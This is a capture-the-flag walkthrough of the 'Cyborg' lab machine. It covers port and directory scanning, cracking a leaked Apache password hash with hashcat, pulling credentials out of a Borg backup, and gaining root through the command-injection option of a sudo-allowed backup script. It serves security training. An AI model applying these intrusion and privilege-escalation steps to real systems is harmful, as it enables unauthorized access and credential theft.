# Cyborg

## Enumeration

### I started by scan the ports to answer to the first question

I used this nmap command : nmap -A -p- -T4 _IP_
  - _-A or -sV : Enables version detection_
  - _-p- : to scan every 65535 port_
  - _-T<0-5>: Set timing template (higher is faster)_

```bash
└─$ nmap -A -p- -T4 10.10.252.51
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-04 13:02 BST
Nmap scan report for 10.10.252.51
Host is up (0.048s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.48 seconds
```
### I've found that 2 ports are opened 80 (http) and 22 (ssh),  with this I can answer the question 2 and 3

### After I used feroxbuster which is a very powerfull web fuzzer

```bash
└─$ feroxbuster --url http://10.10.252.51 --wordlist  /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -t 200

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.252.51
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       15l       74w     6143c http://10.10.252.51/icons/ubuntu-logo.png
301      GET        9l       28w      312c http://10.10.252.51/admin => http://10.10.252.51/admin/
200      GET      375l      968w    11321c http://10.10.252.51/
301      GET        9l       28w      310c http://10.10.252.51/etc => http://10.10.252.51/etc/
200      GET        6l       27w      258c http://10.10.252.51/etc/squid/squid.conf
[#>------------------] - 7m    193242/2370492 76m     found:5       errors:23897  
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_10_10_252_51-1720095021.state ...
[#>------------------] - 7m    193301/2370492 76m     found:5       errors:23923  
[#>------------------] - 7m     99544/1185240 241/s   http://10.10.252.51/ 
[#>------------------] - 7m     93730/1185240 227/s   http://10.10.252.51/admin/ 
[####################] - 2s   1185240/1185240 570925/s http://10.10.252.51/etc/ => Directory listing
[####################] - 2s   1185240/1185240 741702/s http://10.10.252.51/etc/squid/ => Directory listing
```
### I've look around /etc/squid and I've found the passwd file where the music_archive's password hash is written

## Exploitation

### music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.

```bash
└─$ hashcat -m 1600 -a 0 hash /usr/share/wordlists/rockyou.txt

$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:*********           
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
Hash.Target......: $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
Time.Started.....: Thu Jul  4 13:34:59 2024 (1 sec)
Time.Estimated...: Thu Jul  4 13:35:00 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    38096 H/s (6.59ms) @ Accel:128 Loops:250 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 39936/14344385 (0.28%)
Rejected.........: 0/39936 (0.00%)
Restore.Point....: 38912/14344385 (0.27%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:750-1000
Candidate.Engine.: Device Generator
Candidates.#1....: treetree -> prospect
Hardware.Mon.#1..: Temp: 84c Util: 97%

Started: Thu Jul  4 13:34:49 2024
Stopped: Thu Jul  4 13:35:01 2024
```
### On the /admin page, I could download archive.tar on the "Archive" tab and I've untar it

### In the README I've found the Borg documentation link : https://borgbackup.readthedocs.io/en/stable/, I've found a lot of command very usefull.

```bash
└─$ borg list home/field/dev/final_archive 

Enter passphrase for key /home/ciikorrr/CTF/Cyborg/home/field/dev/final_archive: 
music_archive                        Tue, 2020-12-29 14:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]

└─$ borg extract home/field/dev/final_archive::music_archive

└─$ cd home/alex/Documents

└─$ cat note.txt   
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:**********
```
### After have found the alex credentials, I'm connected on his ssh session

```ssh alex@IP```

## User FLAG

```bash
alex@ubuntu:~$ cat user.txt 
flag{**********************}
```

## Privilege Escalation

### I started with a basic sudo -l to enumerate all commands authorised by alex as another user, I've found that alex can execute a script as any user (so in root too)

```bash
alex@ubuntu:~$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

### By luck, the backup.sh file is readable so I analyzed it
```bash
alex@ubuntu:~$ cat /etc/mp3backups/backup.sh
#!/bin/bash

sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt


input="/etc/mp3backups/backed_up_files.txt"
#while IFS= read -r line
#do
  #a="/etc/mp3backups/backed_up_files.txt"
#  b=$(basename $input)
  #echo
#  echo "$line"
#done < "$input"

while getopts c: flag
do
	case "${flag}" in 
		c) command=${OPTARG};;
	esac
done



backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"

# Where to backup to.
dest="/etc/mp3backups/"

# Create archive filename.
hostname=$(hostname -s)
archive_file="$hostname-scheduled.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"

echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"

cmd=$($command)
echo $cmd
```
### 2 things are interesting in the script

```bash
while getopts c: flag
do
	case "${flag}" in 
		c) command=${OPTARG};;
	esac
done
```
```bash
cmd=$($command)
echo $cmd
```
### If I specify a -c option to the script, it will run the command that I want

## Root FLAG

```bash
alex@ubuntu:~$ sudo /etc/mp3backups/backup.sh -c "cat /root/root.txt"

flag{***************************}
```



